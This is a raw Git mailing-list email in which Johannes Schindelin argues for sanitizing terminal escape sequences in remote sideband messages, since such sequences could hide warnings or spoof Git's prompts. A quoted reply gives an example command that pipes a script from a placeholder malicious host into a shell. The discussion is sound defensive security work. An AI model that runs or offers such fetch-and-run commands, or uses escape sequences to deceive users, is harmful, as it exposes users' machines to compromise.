Received: from mout.gmx.net (mout.gmx.net [212.227.15.15])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 956E032143C
	for <git@vger.kernel.org>; Tue,  2 Dec 2025 14:12:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=212.227.15.15
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1764684732; cv=none; b=uPHlUZUBciHeZnQvR88EstMqxA/U7cIA++h0zeAqvyyitaQm253PMkaGgGbQ4LV8kZsikNkm/VKzi1alFnqmi4+APS4g0kKqp57V80dxqBBKBa9AzwAqWBrArzLF04YHk+dcguPmpx5Oo72uYkUMb+XU9uJ807gDAQXXl7kdZKg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1764684732; c=relaxed/simple;
	bh=qOUnAyyBjztY8K1WL2l23aZqITd1SnsTP/CWLwEX31U=;
	h=Date:From:To:cc:Subject:In-Reply-To:Message-ID:References:
	 MIME-Version:Content-Type; b=mS2XzmZs5QUQaDOraeogtZ5JqS+lMN7PzZH2ooWT75HHJ/SA3WQwpY2P+YoYXqOczKXUE1OI7503nfusC2E5flrkEoWHeRkBxYExmc9RcESU9K2/ZPohrj/1XH6iCDNk1AUYcx90lba1KP5hdXEseXsC7mzPuTqTv+UfrGP8ZBs=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=gmx.de; spf=pass smtp.mailfrom=gmx.de; dkim=pass (2048-bit key) header.d=gmx.de header.i=johannes.schindelin@gmx.de header.b=lvfNuJ+I; arc=none smtp.client-ip=212.227.15.15
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=gmx.de
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmx.de
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmx.de header.i=johannes.schindelin@gmx.de header.b="lvfNuJ+I"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmx.de;
	s=s31663417; t=1764684716; x=1765289516;
	i=johannes.schindelin@gmx.de;
	bh=oqJ59qryvwwav76AOYe32fdWt+dbfVq3Bb93xrvxhQo=;
	h=X-UI-Sender-Class:Date:From:To:cc:Subject:In-Reply-To:Message-ID:
	 References:MIME-Version:Content-Type:Content-Transfer-Encoding:cc:
	 content-transfer-encoding:content-type:date:from:message-id:
	 mime-version:reply-to:subject:to;
	b=lvfNuJ+Il56+XEHMr5/dmcHnnePZXVKTbh+D1f7H3eALgoi0jCq3hJH3s8YMV7ii
	 9y4dx1IeaGZdBfHteWkRg7LY+1Fc8H9+ybQmNeEX6Ab6GHH1/wtUQaczZ51h+XRLr
	 pquJXSmPDhfReXnrSfMARlJTIsVeSA7LA+u8s12qn094TqCb5WDoexK3Aum1b1SMZ
	 LUagOya0fNVf5dzsIsbkGUUaFcdzkOt2VWO8eXJ/R8Z4YNDr1ZoVYF2L+5E0SGztd
	 3Xg6xWBHrekrumvLDkC1XNERlyrhM2TnubdTMOAMA4aSfJO6tG+PvACAawGMvAoTY
	 vCSflpiwJQj4RQHcvQ==
X-UI-Sender-Class: 724b4f7f-cbec-4199-ad4e-598c01a50d3a
Received: from [172.23.242.68] ([89.1.213.165]) by mail.gmx.net (mrgmx004
 [212.227.17.190]) with ESMTPSA (Nemesis) id 1MzQg6-1wLPPo2TQW-017nme; Tue, 02
 Dec 2025 15:11:56 +0100
Date: Tue, 2 Dec 2025 15:11:54 +0100 (CET)
From: Johannes Schindelin <Johannes.Schindelin@gmx.de>
To: Junio C Hamano <gitster@pobox.com>
cc: "brian m. carlson" <sandals@crustytoothpaste.net>, 
    Johannes Schindelin via GitGitGadget <gitgitgadget@gmail.com>, 
    git@vger.kernel.org
Subject: Re: [PATCH 0/3] Sanitize sideband channel messages
In-Reply-To: <xmqqwmevtfye.fsf@gitster.g>
Message-ID: <f4a0cf5a-fe35-e038-a78e-e87caef03780@gmx.de>
References: <pull.1853.git.1736878772.gitgitgadget@gmail.com> <Z4bqMYKRP7Gva5St@tapette.crustytoothpaste.net> <xmqqwmevtfye.fsf@gitster.g>
Precedence: bulk
X-Mailing-List: git@vger.kernel.org
List-Id: <git.vger.kernel.org>
List-Subscribe: <mailto:git+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:git+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII
X-Provags-ID: V03:K1:TTp0QH6yVDMsPHkOVB5fmxZaqA3D1ieqgpGEw9xTv/p8eGIk64g
 U1CtMETrt8SWRrHZ8y8F9syuMEuWkl/4XPcr1YoCnwLBwmPNSwc12P5fGTPMdFBBAq0FOK2
 66ymM/2sFsZCqA7MIoF4R5cLDkOt1Kr1tfjqMjZnFaojJQW9kXhBaL7RQNhnzQibjLsjKsp
 O/fqh+GG0OZFfpI0BHz0A==
X-Spam-Flag: NO
UI-OutboundReport: notjunk:1;M01:P0:V/g2RDOMXB8=;MWaJiZwiKUlfhnNiTbtMfne6nGn
 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
Content-Transfer-Encoding: quoted-printable

Hi Junio,

On Wed, 15 Jan 2025, Junio C Hamano wrote:

> "brian m. carlson" <sandals@crustytoothpaste.net> writes:
>=20
> > Where pre-receive hooks are available, people frequently run various
> > commands to test and analyze code in them, including build or static
> > analysis tools, such as Rust's Cargo.  Cargo is capable of printing a
> > wide variety of escape sequences in its output, including `\e[K`, whic=
h
> > overwrites text to the right (e.g., for progress bars and status outpu=
t
> > much like Git produces), and sequences for hyperlinks.  Stripping thes=
e
> > sequences would break the output in ways that would be confusing to th=
e
> > user (since they work fine in a regular terminal) and hard to
> > reproduce or fix.
>=20
> You have ruled out the attack vector that lets bytestream sent to
> the terminal emulator to somehow cause arbitrary input bytes added
> (which may require the final <ENTER> from the user but that is not
> much of consolation), and I tend to agree with you on that point.

So you haven't come across `OSC P 1 0 ; ? ST` (see e.g.
https://www.xfree86.org/current/ctlseqs.html#:~:text=3DOSC%20P%20s%20;%20P=
%20t%20ST
for this control sequence, as well as others that elicit responses from
terminal emulators, from current cursor position to terminal
capabilities)? I use this Escape sequence myself in my `tmux` sessions to
toggle the colors between bright-on-dark and dark-on-bright.

It is true that many terminal emulators started disabling support for such
Escape sequences. But that's not because the terminal emulators' features
were buggy. That's because some console programs are buggy, allowing
payload originating from outside the user's trust boundary to be passed
through to the terminal without proper sanitizing. That's what the entire
CWE-150 weakness class (https://cwe.mitre.org/data/definitions/150.html)
is all about.

And yes, it's the console programs that are buggy, not the terminal
emulators. It has always been the contract between terminal emulators and
software using those terminal emulators' features that the bytes that are
sent to the terminal emulator can do amazing stuff via control sequences
(that's the terminal emulators' promise) and the responsibility of the
software sending those bytes, in turn, is to make sure that it only sends
control characters intentionally and does not nilly-willy pass through
untrusted data from random outside sources.

That's the reason why even `tar` sanitizes its output, see
https://www.gnu.org/software/tar/manual/html_node/quoting-styles.html. Or
for that matter, cURL, see https://github.com/curl/curl/pull/1512 where
Escape sequences were part of the rationale.

While `mutt` might not sanitize the Escape sequences in the emails it
displays, it does something even better: It implements its own terminal
emulator that interprets only a very limited set of ANSI Escape sequences.
But since it uses ANSI Escape sequences to render the output, so in a very
convoluted way it _does_ sanitize Escape sequences.

Basically, all console programs interacting with terminal emulators are
careful about sanitizing untrusted payload before sending it to be
rendered.

In short, in this context it is clearly Git's responsibility to ensure
that control sequences do not originate from some stranger's server on the
internet and then are naively passed through to the terminal emulator
without the user's blessing. Git uses coloring sequences, after all, so it
benefits from the contract with the terminal emulator, and it must uphold
its end of the bargain, too.

Git also does an okay job of avoiding those color sequences when its
output does not even go to a terminal emulator, or when the `TERM`
environment variable indicates that the terminal emulator lacks
the prerequisite capabilities. (To do a better job, it would have to
query the terminal's capabilities, a job better left to libraries like
ncurses).

That check, whether the output is even sent to a terminal emulator or not,
is notably something that cannot ever be done by those `pre-receive` hooks
that were held up as examples to block this here patch series: They have
no way of knowing whether or not their output goes to a terminal, but they
send the control sequences anyway. Because YOLO, I guess. In that
respect, I think that even you two would agree that those `pre-receive`
hooks are broken by design.

> With that misfeature out of the picture, I am not sure why terminal
> escape sequences that may clear or write-over things on the screen
> are of particular interest.

It is important for attackers to try to hide any traces that might alert
their victims that they are being attacked. One fine way to do that is to
hide the output that would otherwise scream "You are under attack!" to the
user. Writing over such tell-tales, or erasing them altogether, is the
perfect tool for the job. As such, they are clearly of particular interest
in this context.

Sure, it is conceivable that there might be use cases where it _is_
desirable that certain text is first written and then overwritten by the
remote side. But the fact remains that it forcibly keeps open the door to
deceive the user into believing that they see something that they do not
actually see.

For example, Git goes out of its way to write out sideband messages only
with the `remote:` prefix. This is a very clear indicator that these
messages do not come from the local Git process, and users are very likely
to be extremely suspicious if they are prompted for some interactive input
in such a message. Allow the remote server to overwrite that prefix, and
you take away that indicator.

Besides, there are correct ways to send colored, or otherwise styled, text
to the user from the remote side: The remote side does not have the
ability to ask whether the output goes to a terminal, but the local Git
process does! The logic of color-coding the `error` and `warning` and
friends that was added in bf1a11f0a10 (sideband: highlight keywords in
remote sideband output, 2018-08-07) is a perfect example how this should
be done: The client side, the one with access to the terminal emulator,
decides what is permissible styling, and the remote side crafts its output
accordingly. No verbatim pass-through of control sequences, no
vulnerability, instant win. Well, not so instant, you first have to get
the patch on Git's side accepted, but that's par for the course.

Now, the capacities of modern terminal emulators are a far cry from what
they had been in the VT-100 times. As in: They have become drastically
more powerful. As illustrated at the beginning of my reply, there exist
powerful features to query information about the current terminal. Not all
of them are exploitable for malicious purposes on first sight. The crucial
part is: on first sight.

Also, it is relatively easy if you fail to protect your terminal emulator
to have your entire session messed up to a point where not even a `reset`
restores it. And corrupting the terminal session is still much better than
getting pranked by having all of Git's output be overwritten with a
picture of a snake (download the raw version of
https://github.com/csdvrx/sixel-testsuite/blob/master/snake.six -- after!
verifying that it is just a regular text file containing only a few
harmless escape sequences~ -- and then `cat` it to your terminal). That
could have been goatse, too, though. Or for that matter (as
https://github.com/mpv-player/mpv demonstrates, which allows you to render
entire Youtube videos in your current terminal window) you could be
Rick-rolled. And all of those are still pranks more than anything. Much
worse can be done with those terminal emulator capabilities.

> If the malicious remote end says something like
>=20
>     To proceed, open another window and type this command:
>=20
> 	$ curl https://my.malicious.xz/install.sh | sh
>=20
> to its output, even if the message is shown with the "remote: "
> prefix on the receiving local client, wouldn't that cause certain
> percentage of end-user population to copy-and-paste that command
> anyway?

Sure, and there is no defending against users who voluntarily follow such
instructions without applying some healthy skepticism first. Not in Git,
anyways.

The kind of control illustrated above, however, can of course also be used
to pretend that _Git_ asks interactively for some input, using the exact
look&feel of Git's usual interactive prompts. And presented with something
like that, I would wager a bet that even you could fall for an elaborate
ruse, if I were a betting person. If I were still a student, with too much
time on my hands, I'd even try to prank you that way, purely for fun.

For the record, I was almost successfully gas-lit into believing that this
here issue is not even a vulnerability, as was claimed by some (but not
all) involved in the discussion on the Git security list. Fortunately I am
in a wonderful position that I have access to outstanding security
researchers, and I asked two of them, independently, to tell me whether or
not this is a vulnerability that needs to be fixed. Independently, both
agreed that my assessment "High" was too high, and it should have been
"Moderate" instead. At the same time, they also both agreed that it is a
vulnerability that should be fixed in Git.

I did hear that Google employs some excellent security professionals, too.
While I cannot ask them directly, I would be quite curious what they would
have to say about this issue. Maybe you could contact one or two?

Ciao,
Johannes

>=20
> > I agree that this would have been a nice feature to add at the beginni=
ng
> > of the development of the sideband feature, but I fear that it is too
> > late to make an incompatible change now.
>=20
> So I am not so sure even it would have been a "nice feature" to disallow
> sideband messages to carry terminal escape sequences to begin with.
>=20
> > I realize that you've provided an escape hatch, but as we've seen with
> > other defense-in-depth measures, that doesn't avoid the inconvenience
> > and hassle of dealing with those changes and the costs of deploying
> > fixes everywhere.
>=20
> One more thing that I am not so happy about these "escape hatches"
> is that they tend to be all or nothing (not limited to this round,
> but common to other defense-in-depth attempts).  Having to say "I
> trust them completely" is something that would make people uneasy.
>=20
> > We need to consider the costs and impact of these
> > patches on our users, including the burden of dealing with incompatibl=
e
> > changes, and given the fact that this problem can occur in a wide
> > variety of other contexts which you are not solving here and which wou=
ld
> > be better solved more generally in terminal emulators themselves, I
> > don't think the benefits of this approach outweigh the downsides.
> >
> > I do agree that there are terminal emulators which have some surprisin=
g
> > and probably insecure behaviour, as we've discussed in the past, but
> > because I believe those issues are more general and could be a problem
> > for any terminal-using program, I continue to believe that those issue=
s
> > are best addressed in the terminal emulator itself.
>=20
>=20
